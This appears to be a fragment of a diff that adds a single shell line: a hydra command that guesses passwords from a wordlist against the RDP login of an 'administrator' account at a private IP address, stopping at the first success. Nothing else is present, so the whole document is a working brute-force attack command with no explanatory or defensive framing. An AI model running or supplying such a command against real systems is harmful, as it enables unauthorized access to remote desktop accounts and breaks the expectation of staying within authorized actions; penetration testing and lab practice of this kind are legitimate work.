@@ -1,0 +1,3 @@
+hydra -t 1 -V -f -l administrator -P wordlist.txt rdp://192.168.0.100
+
+
